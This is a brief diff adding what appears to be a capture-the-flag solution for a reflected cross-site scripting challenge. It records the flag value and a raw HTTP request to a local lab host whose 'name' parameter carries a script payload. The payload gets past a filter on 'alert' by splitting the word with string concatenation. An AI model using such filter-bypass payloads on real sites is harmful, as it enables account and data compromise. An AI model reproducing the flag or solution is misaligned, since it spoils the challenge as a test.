@@ -1,0 +1,4 @@
+# Reflected XSS via name param. Filter blocks literal 'alert'; bypass uses window['al'+'ert']('XSS') string concat. Returns flag{2fba7376-856b-4b60-8eeb-c54c23186622}.
+
+GET /page?name=<script>window['al'%2B'ert']('XSS')</script> HTTP/1.1
+Host: 172.17.0.1:50935
